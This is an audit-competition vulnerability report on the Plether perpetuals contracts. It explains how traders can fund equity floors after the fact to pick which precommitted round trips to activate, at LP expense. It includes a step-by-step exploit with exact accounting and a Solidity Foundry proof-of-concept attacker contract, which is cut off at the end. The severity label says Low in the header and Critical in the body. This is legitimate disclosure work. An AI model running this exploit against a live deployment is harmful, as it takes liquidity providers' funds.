# \#98706 [SC-Low] Unfunded equity bounds and later margin additions let traders selectively activate precommitted round trips at LP expense

**Submitted on Nov 9th 2026 at 17:44:29 UTC by @n0fr33w1f14u for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98706
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
An account with an existing position can commit orders whose `minPostPositionEquityAssets` bounds fail against its current position margin. The evaluator checks those bounds against live collateral at execution, and `addMargin()` remains available while the orders are pending. After observing the fixed historical entry and exit prices, the trader can add margin and execute a profitable sequence atomically. For an unfavorable sequence, it can leave the bounds unsatisfied and self-execute the orders to terminal failure, releasing the committed margin and recovering the opening bounty. Gas and oracle fees still apply.

The construction below uses one increase and two partial reductions, all admissible against the existing position. Both entry and exit prices are known before funding. The favorable branch gains 115.080002 USDG after trading fees and VPI, before native costs. It restores the starting position size and exact entry basis; realized proceeds increase active position margin to 100,166.811792 USDG. The original position retains its market exposure.

## Vulnerability Details
The protocol documents binding delayed orders as protection against turning queued intents into free options (packages/perps/SECURITY.md). The defect is the interaction between an unfunded user specified equity floor and its live collateral basis. Margin additions and self execution bounty settlement enable the sequence; they need not be independent vulnerabilities.

**1. Unfunded Commit Bounds (`OrderLiquidationBatchLogic.sol`)**

`_validateFreshRequest()` checks timing, modes, configuration, leverage-bound shape, and base order parameters. `_validatedOpenBounty()` previews ordinary Engine admission without evaluating the request's equity floor. `_commitOrder()` explicitly checks funding for a positive `minPostSettlementBalanceAssets`, but has no equivalent funding or collateral basis commitment for `minPostPositionEquityAssets`. The lifecycle book stores that floor for execution-time enforcement.

An order can consequently pass ordinary Engine admission while failing its user-specified floor. In the demonstrated price paths, it remains unable to execute until the trader adds active margin. Relevant source: `packages/perps/src/router/OrderLiquidationBatchLogic.sol:233-318,404-454`.

**2. Mid-Queue Collateral Mutation (`CfdEngine.sol`)**

`addMargin()` requires an existing position and owner authorization. It locks free settlement as additional position margin while orders remain pending:

```solidity
// packages/perps/src/CfdEngine.sol; excerpt
StoredPosition storage pos = _positions[account];
if (pos.lots == 0) {
    revert CfdEngine__NoOpenPosition();
}

bytes32 expectedOldHash = _beginTerminalCurveMutation(account);
_realizeCarryFromSettlement(account, pos);
uint256 marginBefore = _positionMarginBucketAssets(account);
clearinghouse.lockPositionMargin(account, amount);
_sideState(pos.side).totalMargin += amount;
_syncPositionBorrowBaseToMargin(pos, marginBefore + amount);
```

The evaluator reloads live pledge and computes post position equity from projected position margin, same account claims, and price PnL. A late top up can therefore turn a committed floor failure into a fill without changing the order's commitment timestamp or historical execution price.

Margin additions support position safety. The security gap is allowing later collateral to activate an earlier commitment's financial condition. A remedy should preserve safe top-ups while preventing that discretionary activation, including through equivalent collateral-sensitive bounds.

**3. Self-Execution Recovers the Opening Bounty (`OrderRouter.sol`)**

An equity-floor violation is terminal. The sidecar passes `request.executor` as the bounty recipient. Terminal settlement releases committed margin and returns the opening bounty when the executor is the order account:

```solidity
// packages/perps/src/OrderRouter.sol; excerpt
if (bountyAssets != 0) {
    settlement.bountyRecipient = bountyRecipient;
    settlement.bountyDisposition = OrderV3Types.BountyDisposition.Paid;
    if (bountyRecipient == order.account) {
        clearinghouse.releaseReservedExecutionBountyToSource(order.account, bountyAssets);
    } else {
        engine.creditBounty(
            order.account, bountyRecipient, bountyAssets, accountingPrice, accountingPublishTime
        );
    }
}
```

This branch also applies to ordinary failed opening orders. `BountyDisposition.Paid` does not mean the trader loses funds when recipient and source are the same account. Reductions have authenticated zero-amount bounty records. Self-cleanup thus incurs native costs but no forfeited opening bounty or trading charges for the rejected sequence.

## Impact Details
The trader gains a collateral-controlled option over precommitted entry and exit prices. It can activate a profitable round trip after observing both fills, while leaving an unfavorable sequence unable to execute. In the PoC run, the account's settlement wealth rises by 115.080002 USDG and HousePool cash falls by 185.000007 USDG. The base position's size and entry basis return to their starting values; its active margin increases because the engine retains part of the close proceeds there.

**Severity: Critical — direct theft of user funds**. This report demonstrates extraction of LP capital through selective historical-price execution. It does not establish that the whole pool can be drained in one transaction or that insolvency necessarily follows.

The strategy requires an existing funded position, available capital, valid signed historical payloads, native fees, and an eligible live market. The original position retains market exposure. Another keeper can destroy an opportunity by processing the unfunded orders early and may collect the opening bounty. No public-mempool observation, keeper front-running, privileged service access, clock misalignment, or LP-depth manipulation is required. Orders must remain pending, become the executable global FIFO prefix, and execute before expiry.

Fixed `targetPrice` bounds do not provide equivalent discretion. Consider two histories with the same increase fill of `1.00`, but later reduction fills of `0.998` and `1.002`. A fixed increase target behaves identically in both. The mutable equity floor lets the trader activate the increase only after seeing the reduction price. A reduction slippage failure alone would leave an already executed increase exposed.


## Step-by-Step Explanations


**Step 1: The Setup (Establish an Existing Position)**

1. The attacker uses contract account `A` as position owner, order account, and executor. The same contract calls `addMargin()` and the router, satisfying account-owner authorization and the self-execution bounty condition.
2. Begin with an active, unpaused live market, 10,000,000 USDG of accounted pool cash, sufficient Junior-backed capacity, and no other positions or trader claims. Ordinary liquidity provision can establish this state; no release risk parameters need changing.
3. `A` opens a **100,000-token LONG (1,000 lots)** at execution price `1.00`, supplying 100,145 USDG order margin plus the separately reserved opening bounty. The fee is 40 USDG, VPI is 5 USDG, and liquidation-reserve funding is 100 USDG. Self-execution leaves:
   * Exact entry cost: **100,000 USDG**.
   * Active PnL pledge: **100,000 USDG**.
   * Liquidation reserve: **100 USDG**.
   * Positive lifetime VPI accrual: **5 USDG**.
   * Pool cash: **10,000,005 USDG** after the VPI inflow; the fee goes to Treasury.
4. The LONG maximum-profit envelope equals its 100,000 USDG pledge, making the borrow base zero. The subsequent funded positions also remain fully pledge-backed, so carry is zero. The seed trade's 45 USDG fee/VPI expenditure is a setup cost, separate from the incremental gain below.
5. `A` has enough free settlement to reserve another 2,000 USDG margin and the 0.20 USDG opening bounty, and later add **98,154.999993 USDG** to pledge. These funds can be deposited beforehand: free settlement alone does not satisfy the post-position equity floor.

**Step 2: Commit the Lookahead Sequence with Distinct Price Windows**

1. At timestamp `T`, commit **Order 1 (Increase Position)**:
   * LONG; `isClose = false`.
   * `sizeDelta = 100_000e18`: **100,000 tokens (1,000 lots)**.
   * `marginDelta = 2_000e6`: **2,000 USDG**.
   * `minPostPositionEquityAssets = 120_000e6`: **120,000 USDG**.
2. At `T + 1`, Order 1's first eligible historical basket is published, giving execution price **1.00**. No order has executed yet.
3. At `T + 2`, commit **Order 2 (Partial Reduction)** and **Order 3 (Partial Reduction)** in FIFO order:
   * Order 2: LONG close of **98,000 tokens (980 lots)**, zero margin delta, **99,000 USDG equity floor**.
   * Order 3: LONG close of **2,000 tokens (20 lots)**, zero margin delta, **99,000 USDG equity floor**.
4. Each reduction individually fits the current live 100,000-token position, satisfying Engine close commitment. The router's queued projection also accepts them: projected sizes become 200,000, 102,000, and 100,000 tokens. Three orders fit the release cap of five.
5. Each request uses a fresh ordinary client ID, current nonzero execution-config hash, allowed Live mode, valid submission deadline, 60-second execution duration, and generous maxima for notional, debit, charges, fees, size, and leverage. Set `minPostSettlementBalanceAssets = 0`. Use permissive nonzero targets: raw price `1` for the increase and `CAP_PRICE` for both reductions.
6. At the cached price near `1.00`, ordinary margin, minimum-notional, position-health, skew, and pool-solvency checks pass. The largest resulting notional is 200,000 USDG against approximately 10 million USDG pool cash. The explicit equity floors are not checked for funding at commitment.

**Step 3: Off-Chain Observation**

1. At `T + 3`, the first eligible basket after the reductions' commitment is published. The favorable example gives both reductions execution price **0.998**; an unfavorable comparison is **1.002**.
2. Payloads prove the first eligible update for every feed: Order 1's previous publish times are no later than `T`, and the reductions' previous publish times are no later than `T + 2`. Baskets satisfy component divergence, confidence, freshness, and positive-price requirements. They are genuine post-commit ticks.
3. At `T + 4`, in a later execution block than all commitments, the attacker knows both fills. The baskets remain inside their respective 15-second historical search windows and the 60-second execution/staleness limits. Waiting for the whole 15-second window is unnecessary.
4. The opportunity requires the three orders to remain pending and form the executable FIFO prefix. A competing keeper may remove it through earlier processing. The attacker does not need to observe a pending keeper transaction.

**Step 4A: The Unfavorable Path (Leave the Orders Unfunded)**

1. If the increase fills at `1.00` and reductions would fill at `1.002`, the LONG round trip loses value. `A` leaves pledge unchanged and calls `executeOrder()` sequentially for each order with its valid historical payload, paying native fees.
2. Order 1's ordinary plan is valid, but projected equity is **101,845.000007 USDG**, below **120,000 USDG**. It fails before Engine application. Cleanup releases its 2,000 USDG margin and returns its 0.20 USDG bounty to `A`.
3. Order 2 is assessed against the unchanged original position. Surviving pledge is 2,000 USDG and surviving price PnL is -4 USDG: **1,996 USDG equity**, below **99,000 USDG**. It fails before application.
4. Order 3 is independently assessed against the same unchanged original position. Surviving pledge is 98,000 USDG and price PnL is -196 USDG: **97,804 USDG equity**, below **99,000 USDG**. It also fails before application.
5. All three orders terminalize without any position change or trading charges. The original position remains exposed. Native execution/oracle costs are spent. If a third party performs cleanup, it receives the opening bounty instead.

**Step 4B: The Favorable Path (Activate and Execute the Profitable Sequence)**

1. With increase fill `1.00` and both reduction fills `0.998`, `A` submits one atomic transaction. It calls `addMargin(A, 98154999993)` (98,154.999993 USDG), then `executeOrder()` for Orders 1, 2, and 3 using their respective historical payloads. The contract checks that all results are `Executed` at the expected prices; otherwise it reverts the enclosing transaction, including the top-up and earlier executions. This also handles competing cleanup that has already removed an order.
2. Order 1 incurs **14.999993 USDG VPI**, **40 USDG execution fee**, and **100 USDG additional liquidation reserve**. Its active pledge becomes:

   ```text
   100,000 + 98,154.999993 + 2,000 - 14.999993 - 40 - 100
   = 200,000 USDG
   ```

   Existing price PnL is zero, so **200,000 USDG equity** passes the 120,000 floor. Size becomes 200,000 tokens and exact entry cost becomes 200,000 USDG.
3. Order 2 closes 98,000 tokens at `0.998`, realizes **196 USDG price profit**, and releases 98,000 USDG pledge. The engine credits **166.678396 USDG** of net close proceeds to the remaining position margin, which becomes 102,166.678396 USDG. Including 204 USDG unrealized PnL, the receipt reports **102,370.678396 USDG equity**, passing 99,000.
4. Order 3 closes 2,000 tokens at `0.998`, realizes **4 USDG price profit**. After releasing 2,003.268203 USDG of margin and crediting **3.401599 USDG** of net close proceeds, the remaining pledge is **100,166.811792 USDG**. Including 200 USDG unrealized PnL, the receipt reports **100,366.811792 USDG equity**, passing 99,000.
5. Both reductions remain partial even when the increase fails, so the full-close exception cannot skip their equity checks. At these favorable prices, the unfunded and funded projections are:

   | Operation | Equity without funding, earlier orders failing | Equity with funding, earlier orders executing | Floor |
   | --- | ---: | ---: | ---: |
   | Increase 100,000 tokens | 101,845.000007 | 200,000 | 120,000 |
   | Reduce 98,000 tokens | 2,004 | 102,370.678396 | 99,000 |
   | Reduce 2,000 tokens | 98,196 | 100,366.811792 | 99,000 |

6. Fees and the proportional lifetime-VPI clamp give the following six-decimal accounting. Pool cash supports immediate payouts, and carry is zero:

   | Operation | Realized price PnL | Execution fee | Signed VPI |
   | --- | ---: | ---: | ---: |
   | Increase | 0 | 40 | 14.999993 |
   | Reduce 98,000 tokens | 196 | 39.121600 | -9.799996 |
   | Reduce 2,000 tokens | 4 | 0.798400 | -0.199999 |
   | **Total** | **200** | **79.920000** | **4.999998** |

   ```text
   Incremental settlement-custody gain, excluding new deposits
   = 200 - 79.920000 - 4.999998
   = 115.080002 USDG before native gas and oracle costs
   ```

7. The surviving position again has **100,000 tokens** and **100,000 USDG exact entry cost**. Its active pledge is **100,166.811792 USDG**, as the engine retains part of the realized close proceeds in margin. Its 200 USDG unrealized PnL at `0.998` equals the original position's exposure without the sequence. Positive lifetime VPI accrual changes from 5 to 9.999998 USDG, and liquidation reserve falls from 100 to 99.8 USDG; neither change is counted as extra cash profit. Settlement wealth rises by **115.080002 USDG** from the favorable sequence.

## Proof of Concept

## PoC
/test/poc/UnvalidatedEquityBoundAddMargin.t.sol passed with the local Engine, Router, and Pool contracts using `MockPyth` historical updates. It confirms this accounting path with deterministic mock prices; it does not authenticate real Pyth signatures or include native gas and oracle costs. Repeated opportunities depend on signed-price movements and survival of competing cleanup. The demonstrated advantage is deciding whether to activate the round trip after both fill prices are known.


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../packages/perps/test/perps/BasePerpTest.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {ICfdOrderPolicyEvaluator} from "@plether/perps/interfaces/ICfdOrderPolicyEvaluator.sol";

/// @dev Contract account used to make addMargin() and the three order executions one atomic call.
contract PostCommitMarginOptionActor {

    error OnlyOwner();
    error InvalidBatch();
    error OrderDidNotExecute(uint64 orderId, OrderV3Types.LifecycleStatus status);

    address private immutable _owner;
    CfdEngine private immutable _engine;
    MarginClearinghouse private immutable _clearinghouse;
    OrderRouter private immutable _router;

    constructor(CfdEngine engine_, MarginClearinghouse clearinghouse_, OrderRouter router_) {
        _owner = msg.sender;
        _engine = engine_;
        _clearinghouse = clearinghouse_;
        _router = router_;
    }

    modifier onlyOwner() {
        if (msg.sender != _owner) revert OnlyOwner();
        _;
    }

    function deposit(IERC20 settlementToken, uint256 assets) external onlyOwner {
        settlementToken.approve(address(_clearinghouse), assets);
        _clearinghouse.deposit(address(this), assets);
    }

    function commit(
        OrderV3Types.OrderRequest calldata request
    ) external onlyOwner returns (uint64 orderId) {
        return _router.commitOrder(request);
    }

    function addMarginAndExecute(
        uint256 amount,
        uint64[] calldata orderIds,
        bytes[][] calldata updateData
    ) external onlyOwner returns (OrderV3Types.ExecutionResult[] memory results) {
        if (orderIds.length != updateData.length) revert InvalidBatch();

        _engine.addMargin(address(this), amount);
        results = new OrderV3Types.ExecutionResult[](orderIds.length);
        for (uint256 i; i < orderIds.length; ++i) {
            results[i] = _router.executeOrder(orderIds[i], updateData[i]);
            if (results[i].status != OrderV3Types.LifecycleStatus.Executed) {
                revert OrderDidNotExecute(orderIds[i], results[i].status);
            }
        }
    }

    function executeOrders(
        uint64[] calldata orderIds,
        bytes[][] calldata updateData
    ) external onlyOwner returns (OrderV3Types.ExecutionResult[] memory results) {
        if (orderIds.length != updateData.length) revert InvalidBatch();

        results = new OrderV3Types.ExecutionResult[](orderIds.length);
        for (uint256 i; i < orderIds.length; ++i) {
            results[i] = _router.executeOrder(orderIds[i], updateData[i]);
        }
    }

}

/// @notice PoC for an equity floor that is committed before it is funded, then activated after prices are known.
/// @dev Run with the root Foundry configuration, for example:
///      forge test --match-path test/poc/UnvalidatedEquityBoundAddMargin.t.sol
///      This PoC is intentionally not executed as part of the static audit workflow.
contract UnvalidatedEquityBoundAddMarginPoC is BasePerpTest {

    uint256 private constant PRICE = 1e8;
    uint256 private constant LOWER_PRICE = 99_800_000;
    uint256 private constant INITIAL_SIZE = 100_000e18;
    uint256 private constant INCREASE_SIZE = 100_000e18;
    uint256 private constant INITIAL_ORDER_MARGIN = 100_145e6;
    uint256 private constant INITIAL_POSITION_PLEDGE = 100_000e6;
    uint256 private constant INCREASE_MARGIN = 2_000e6;
    uint256 private constant INCREASE_EQUITY_FLOOR = 120_000e6;
    uint256 private constant CLOSE_EQUITY_FLOOR = 99_000e6;
    uint256 private constant LATE_MARGIN = 98_154_999_993;

    struct MockPrice {
        int64 price;
        uint64 conf;
        int32 expo;
        uint256 publishTime;
        uint256 prevPublishTime;
    }

    struct MockFeedUpdate {
        bytes32 id;
        MockPrice price;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @notice Commits equity floors that fail before funding, then tops up after the historical prices are known.
    /// @dev Proves this mocked three-order sequence can execute and produce the asserted trader gain and pool loss.
    function test_PostCommitTopUpActivatesProfitableRoundTrip() public {
        // The base fixture seeds each tranche with 1,000 USDG. Add enough Junior cash to make total pool depth
        // exactly 10,000,000 USDG before the incumbent position creates its initial VPI inflow.
        _fundJunior(address(this), 9_998_000e6);
        assertEq(pool.totalAssets(), 10_000_000e6, "fixture pool depth");

        PostCommitMarginOptionActor actor =
            new PostCommitMarginOptionActor(engine, clearinghouse, OrderRouter(address(router)));
        settlementToken.mint(address(actor), 210_000e6);
        actor.deposit(settlementToken, 210_000e6);

        // Start with a real existing LONG, which makes partial close commitments admissible before the increase fills.
        _open(address(actor), CfdTypes.Side.LONG, INITIAL_SIZE, INITIAL_ORDER_MARGIN, PRICE);
        uint256 traderWealthBefore = _accountWealth(address(actor));
        uint256 poolAssetsBefore = pool.totalAssets();

        // This order commits an equity floor that the current position cannot meet after the proposed increase.
        uint64 increaseOrder = actor.commit(
            _request(
                bytes32("increase"),
                INCREASE_SIZE,
                INCREASE_MARGIN,
                false,
                PRICE,
                INCREASE_EQUITY_FLOOR
            )
        );

        // The public evaluator confirms the committed condition is currently false, even though commit succeeded.
        (bool assessed, bytes memory revertData) = address(policyEvaluator).staticcall(
            abi.encodeWithSignature(
                "assessCommittedOrder(address,uint64,address,uint256)",
                address(engine),
                increaseOrder,
                address(actor),
                PRICE
            )
        );
        assertFalse(assessed, "the unfunded equity bound must fail before the late margin addition");
        assertEq(_selector(revertData), ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector);
        (OrderV3Types.ConstraintKind failedConstraint, uint256 currentEquity, uint256 requiredEquity) =
            abi.decode(_errorArguments(revertData), (OrderV3Types.ConstraintKind, uint256, uint256));
        assertEq(uint8(failedConstraint), uint8(OrderV3Types.ConstraintKind.PostPositionEquity));
        assertLt(currentEquity, INCREASE_EQUITY_FLOOR);
        assertEq(requiredEquity, INCREASE_EQUITY_FLOOR);

        // O1's first eligible price is 1.00. The two reductions are committed later and receive their own first
        // post-commit tick at 0.998. Their sizes also fit the original live 100,000-token position individually.
        uint64 firstPriceTime = uint64(block.timestamp + 1);
        vm.warp(uint256(firstPriceTime) + 1);
        uint64 reduceMost = actor.commit(
            _request(
                bytes32("reduce-most"), 98_000e18, 0, true, 2e8, CLOSE_EQUITY_FLOOR
            )
        );
        uint64 reduceRest = actor.commit(
            _request(
                bytes32("reduce-rest"), 2_000e18, 0, true, 2e8, CLOSE_EQUITY_FLOOR
            )
        );

        // Read across the cheatcode boundary: via-IR can cache block.timestamp across vm.warp().
        uint64 closePriceTime = uint64(vm.getBlockTimestamp() + 1);
        vm.warp(closePriceTime);
        vm.roll(block.number + 1);

        // The trader now knows both price observations. The actor performs the top-up and all executions atomically;
        // any failed execution reverts the top-up and earlier fills in this call.
        uint64[] memory orderIds = new uint64[](3);
        orderIds[0] = increaseOrder;
        orderIds[1] = reduceMost;
        orderIds[2] = reduceRest;
        bytes[][] memory updates = new bytes[][](3);
        updates[0] = _priceUpdate(PRICE, firstPriceTime, firstPriceTime - 1);
        updates[1] = _priceUpdate(LOWER_PRICE, closePriceTime, closePriceTime - 1);
        updates[2] = _priceUpdate(LOWER_PRICE, closePriceTime, closePriceTime - 1);

        _startRecordingLogs();
        OrderV3Types.ExecutionResult[] memory results = actor.addMarginAndExecute(LATE_MARGIN, orderIds, updates);
        for (uint256 i; i < results.length; ++i) {
            assertEq(uint8(results[i].status), uint8(OrderV3Types.LifecycleStatus.Executed));
        }
        assertEq(router.nextExecuteId(), 0, "all three committed orders must terminalize");

        IOrderLifecycleBook book = IOrderLifecycleBook(address(router.lifecycleBook()));
        OrderV3Types.OrderReceipt memory increaseReceipt = _verifiedReceipt(book, increaseOrder);
        OrderV3Types.OrderReceipt memory reduceMostReceipt = _verifiedReceipt(book, reduceMost);
        OrderV3Types.OrderReceipt memory reduceRestReceipt = _verifiedReceipt(book, reduceRest);

        assertEq(increaseReceipt.executionPrice, PRICE);
        assertEq(reduceMostReceipt.executionPrice, LOWER_PRICE);
        assertEq(reduceRestReceipt.executionPrice, LOWER_PRICE);
        assertEq(increaseReceipt.oraclePublishTime, firstPriceTime);
        assertEq(reduceMostReceipt.oraclePublishTime, closePriceTime);
        assertEq(reduceRestReceipt.oraclePublishTime, closePriceTime);
        assertGt(increaseReceipt.economics.postPositionEquityAssets, int256(INCREASE_EQUITY_FLOOR));
        assertGt(reduceMostReceipt.economics.postPositionEquityAssets, int256(CLOSE_EQUITY_FLOOR));
        assertGt(reduceRestReceipt.economics.postPositionEquityAssets, int256(CLOSE_EQUITY_FLOOR));
        assertGt(reduceMostReceipt.economics.realizedPnlAssets, 0);
        assertGt(reduceRestReceipt.economics.realizedPnlAssets, 0);
        assertEq(
            uint256(reduceMostReceipt.economics.realizedPnlAssets + reduceRestReceipt.economics.realizedPnlAssets),
            200e6,
            "the reductions realize 200 USDG against the 1.00 to 0.998 execution sequence"
        );

        // The round trip realizes value from the pool while restoring the original position size and entry basis.
        // Part of the close proceeds remains in active position margin; the net wealth delta includes PnL, fees,
        // and VPI, and excludes the margin reclassification.
        (uint256 finalSize, uint256 finalMargin,,,,,) = engine.positions(address(actor));
        assertEq(finalSize, INITIAL_SIZE, "position size returns to its starting value");
        assertEq(engine.positionEntryCostAssetAtoms(address(actor)), 100_000e6, "entry basis returns to its start");
        assertGt(finalMargin, INITIAL_POSITION_PLEDGE, "realized profit remains in surviving position margin");
        assertEq(clearinghouse.pnlPledgeAssets(address(actor)), finalMargin);
        assertGt(_accountWealth(address(actor)), traderWealthBefore + 100e6, "net economic gain exceeds 100 USDG");
        assertGt(poolAssetsBefore, pool.totalAssets() + 100e6, "LP pool cash funds the trader's net gain");
    }

    /// @notice Attempts the queued orders at an unfavorable price without adding margin.
    /// @dev Proves the equity checks terminally reject all three before Engine application, leaving position and pool
    ///      state unchanged. It does not model the attacker's ability to prevent a separate permissionless keeper call.
    function test_UnfavorablePriceOrdersFailWithoutTopUpOrTrading() public {
        _fundJunior(address(this), 9_998_000e6);
        assertEq(pool.totalAssets(), 10_000_000e6, "fixture pool depth");

        PostCommitMarginOptionActor actor =
            new PostCommitMarginOptionActor(engine, clearinghouse, OrderRouter(address(router)));
        settlementToken.mint(address(actor), 210_000e6);
        actor.deposit(settlementToken, 210_000e6);
        _open(address(actor), CfdTypes.Side.LONG, INITIAL_SIZE, INITIAL_ORDER_MARGIN, PRICE);

        uint256 traderWealthBefore = _accountWealth(address(actor));
        uint256 poolAssetsBefore = pool.totalAssets();
        (uint256 originalSize, uint256 originalMargin,,,,,) = engine.positions(address(actor));
        uint256 originalEntryCost = engine.positionEntryCostAssetAtoms(address(actor));

        uint64 increaseOrder = actor.commit(
            _request(
                bytes32("unfavorable-increase"),
                INCREASE_SIZE,
                INCREASE_MARGIN,
                false,
                PRICE,
                INCREASE_EQUITY_FLOOR
            )
        );

        uint64 firstPriceTime = uint64(block.timestamp + 1);
        vm.warp(uint256(firstPriceTime) + 1);
        uint64 reduceMost = actor.commit(
            _request(bytes32("unfavorable-reduce-most"), 98_000e18, 0, true, 2e8, CLOSE_EQUITY_FLOOR)
        );
        uint64 reduceRest = actor.commit(
            _request(bytes32("unfavorable-reduce-rest"), 2_000e18, 0, true, 2e8, CLOSE_EQUITY_FLOOR)
        );

        uint64 closePriceTime = uint64(vm.getBlockTimestamp() + 1);
        vm.warp(closePriceTime);
        vm.roll(block.number + 1);

        uint64[] memory orderIds = new uint64[](3);
        orderIds[0] = increaseOrder;
        orderIds[1] = reduceMost;
        orderIds[2] = reduceRest;
        bytes[][] memory updates = new bytes[][](3);
        updates[0] = _priceUpdate(PRICE, firstPriceTime, firstPriceTime - 1);
        updates[1] = _priceUpdate(100_200_000, closePriceTime, closePriceTime - 1);
        updates[2] = _priceUpdate(100_200_000, closePriceTime, closePriceTime - 1);

        // At 1.002, the trader leaves the equity floors unfunded. Router cleanup terminalizes the orders without
        // applying any of the three trades, so the original position remains the only market exposure.
        _startRecordingLogs();
        OrderV3Types.ExecutionResult[] memory results = actor.executeOrders(orderIds, updates);
        for (uint256 i; i < results.length; ++i) {
            assertEq(uint8(results[i].status), uint8(OrderV3Types.LifecycleStatus.Failed));
        }
        assertEq(router.nextExecuteId(), 0, "failed orders must release the FIFO head");

        IOrderLifecycleBook book = IOrderLifecycleBook(address(router.lifecycleBook()));
        OrderV3Types.OrderReceipt memory increaseReceipt = _verifiedReceipt(book, increaseOrder);
        OrderV3Types.OrderReceipt memory reduceMostReceipt = _verifiedReceipt(book, reduceMost);
        OrderV3Types.OrderReceipt memory reduceRestReceipt = _verifiedReceipt(book, reduceRest);
        _assertUnappliedEquityFailure(increaseReceipt, INCREASE_EQUITY_FLOOR, address(actor));
        _assertUnappliedEquityFailure(reduceMostReceipt, CLOSE_EQUITY_FLOOR, address(actor));
        _assertUnappliedEquityFailure(reduceRestReceipt, CLOSE_EQUITY_FLOOR, address(actor));

        (uint256 finalSize, uint256 finalMargin,,,,,) = engine.positions(address(actor));
        assertEq(finalSize, originalSize, "unfavorable orders must not change position size");
        assertEq(finalMargin, originalMargin, "unfavorable orders must not change position margin");
        assertEq(engine.positionEntryCostAssetAtoms(address(actor)), originalEntryCost);
        assertEq(_accountWealth(address(actor)), traderWealthBefore, "self-cleanup must not take settlement wealth");
        assertEq(pool.totalAssets(), poolAssetsBefore, "failed assessments must not move pool cash");
    }

    /// @notice Moves the mock market price against the trader, then has the trader submit no execution call.
    /// @dev Proves the trader can leave its own three orders pending and its position unchanged in this branch; it does
    ///      not prove a permissionless keeper will refrain from processing the queue.
    function test_UnfavorablePriceAttackerSkipsExecutionAndLeavesOrdersPending() public {
        _fundJunior(address(this), 9_998_000e6);
        assertEq(pool.totalAssets(), 10_000_000e6, "fixture pool depth");

        PostCommitMarginOptionActor actor =
            new PostCommitMarginOptionActor(engine, clearinghouse, OrderRouter(address(router)));
        settlementToken.mint(address(actor), 210_000e6);
        actor.deposit(settlementToken, 210_000e6);
        _open(address(actor), CfdTypes.Side.LONG, INITIAL_SIZE, INITIAL_ORDER_MARGIN, PRICE);

        (uint256 originalSize, uint256 originalMargin,,,,,) = engine.positions(address(actor));
        uint256 originalEntryCost = engine.positionEntryCostAssetAtoms(address(actor));

        uint64 increaseOrder = actor.commit(
            _request(
                bytes32("skip-unfavorable-increase"),
                INCREASE_SIZE,
                INCREASE_MARGIN,
                false,
                PRICE,
                INCREASE_EQUITY_FLOOR
            )
        );

        uint64 firstPriceTime = uint64(block.timestamp + 1);
        vm.warp(uint256(firstPriceTime) + 1);
        uint64 reduceMost = actor.commit(
            _request(bytes32("skip-unfavorable-reduce-most"), 98_000e18, 0, true, 2e8, CLOSE_EQUITY_FLOOR)
        );
        uint64 reduceRest = actor.commit(
            _request(bytes32("skip-unfavorable-reduce-rest"), 2_000e18, 0, true, 2e8, CLOSE_EQUITY_FLOOR)
        );

        uint64 unfavorablePriceTime = uint64(vm.getBlockTimestamp() + 1);
        vm.warp(unfavorablePriceTime);
        vm.roll(block.number + 1);
        bytes[] memory unfavorableUpdate =
            _priceUpdate(100_200_000, unfavorablePriceTime, unfavorablePriceTime - 1);
        router.updateMarkPrice(unfavorableUpdate);
        assertEq(engine.lastMarkPrice(), 100_200_000, "the public mark has moved against this LONG");

        // Attacker decision branch: when price is unfavorable, do not call addMarginAndExecute or executeOrder.
        // The live queue remains available for a permissionless keeper to process.
        assertEq(router.nextExecuteId(), increaseOrder, "the original FIFO head remains live");
        assertEq(
            router.nextCommitId(),
            uint256(increaseOrder) + 3,
            "all three orders remain committed after the already-executed setup order"
        );
        assertEq(router.pendingOrderCounts(address(actor)), 3, "the trader leaves all orders pending");

        (IOrderRouterAccounting.PendingOrderView memory liveIncrease,) = router.getPendingOrderView(increaseOrder);
        (IOrderRouterAccounting.PendingOrderView memory liveReduceMost,) = router.getPendingOrderView(reduceMost);
        (IOrderRouterAccounting.PendingOrderView memory liveReduceRest,) = router.getPendingOrderView(reduceRest);
        assertEq(liveIncrease.orderId, increaseOrder);
        assertEq(liveIncrease.sizeDelta, INCREASE_SIZE);
        assertEq(liveReduceMost.orderId, reduceMost);
        assertEq(liveReduceMost.sizeDelta, 98_000e18);
        assertEq(liveReduceRest.orderId, reduceRest);
        assertEq(liveReduceRest.sizeDelta, 2_000e18);

        (uint256 finalSize, uint256 finalMargin,,,,,) = engine.positions(address(actor));
        assertEq(finalSize, originalSize, "skipping execution must not change position size");
        assertEq(finalMargin, originalMargin, "skipping execution must not change position margin");
        assertEq(engine.positionEntryCostAssetAtoms(address(actor)), originalEntryCost);
    }

    function _assertUnappliedEquityFailure(
        OrderV3Types.OrderReceipt memory receipt,
        uint256 equityFloor,
        address account
    ) private pure {
        assertEq(uint8(receipt.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(receipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.PostPositionEquity));
        assertEq(receipt.failure.limit, equityFloor);
        assertFalse(receipt.priceReachedEngine, "equity failure must precede Engine trade application");
        assertEq(receipt.economics.realizedPnlAssets, 0);
        assertEq(receipt.economics.executionFeeAssets, 0);
        if (receipt.bountyAssets != 0) {
